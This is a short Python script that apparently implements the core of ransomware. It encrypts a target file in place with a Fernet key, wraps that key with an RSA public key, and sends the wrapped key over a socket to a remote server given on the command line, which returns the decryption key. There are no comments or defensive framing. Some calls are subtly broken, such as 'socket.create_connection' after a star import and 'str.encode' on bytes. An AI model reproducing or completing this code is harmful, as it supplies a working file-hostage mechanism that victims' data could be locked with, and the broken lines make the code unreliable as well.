from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.fernet import Fernet
import sys
from subprocess import Popen, PIPE
from socket import *

def encrypt_file(sym_key_path, file_path):
    symmetric_key = Fernet.generate_key()
    fernet_instance = Fernet(symmetric_key)

    with open(sym_key_path, "rb") as key_file:
        public_key = serialization.load_pem_public_key(
            key_file.read(),
            backend=default_backend()
        )

    encrypted_symmetric_key = public_key.encrypt(
        symmetric_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )

    with open("encrypted_symmertric_key.key", "wb") as key_file:
        key_file.write(encrypted_symmetric_key)

    with open(file_path, "rb") as file:
        file_data = file.read()
        encrypted_data = fernet_instance.encrypt(file_data)

    with open(file_path, "wb") as file:
        file.write(encrypted_data)

def send_encrypted_key(server_name, e_key_file_path):
    hostname = server_name
    port = 8000
    with socket.create_connection((hostname, port)) as sock:
        with open(e_key_file_path, "rb") as file:
            e_key = file.read()
            sock.sendall(str.encode(e_key))

        d_key = (sock.recv(1024)).decode()
        
        sock.close()

    return d_key

def decrypt_file(file_path, key):
    fernet_instance = Fernet(key)

    with open(file_path, "rb") as file:
        file_data = file.read()
        decrypted_data = fernet_instance.decrypt(file_data)

    with open(file_path, "wb") as file:
        file.write(decrypted_data)

encrypt_file("public_key.key", sys.argv[2])

decrypted_key = send_encrypted_key(sys.argv[1], "encrypted_symmertric_key.key")

decrypt_file(sys.argv[2], decrypted_key)